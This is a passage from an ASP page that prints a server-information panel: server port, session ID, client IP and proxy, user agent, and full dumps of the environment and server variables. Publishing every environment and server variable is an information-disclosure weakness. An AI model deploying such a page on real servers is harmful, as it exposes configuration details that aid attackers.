    <td>SERVER_PORT</td>
    <td><%=request.ServerVariables("SERVER_PORT")%></td>
  </tr>
    <tr>
    <td>SeesionID</td>
    <td><%=Session.SessionID%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style3">Client Infomation</span></td>
  </tr>
  <tr>
    <td>Client Proxy</td>
    <td><%=CP%></td>
  </tr>
  <tr>
    <td>Client IP</td>
    <td><%=CIP%></td>
  </tr>
  <tr>
    <td>User</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<table align=center>
	<tr bgcolor=Black><td align=center><font color=White><b>Environment Variables<b></font></td><td align=center><font color=White><b> Server Variables<b></font></td></tr>
	<tr>
		<td><textArea cols=50 rows=10><% output_all_environment_variables("text") %></textarea></td>
		<td><textArea cols=50 rows=10><% output_all_Server_variables("text") %></textarea></td>
	</tr>
</table>
<% 
End Function
%>
<hr>
</body>
</html>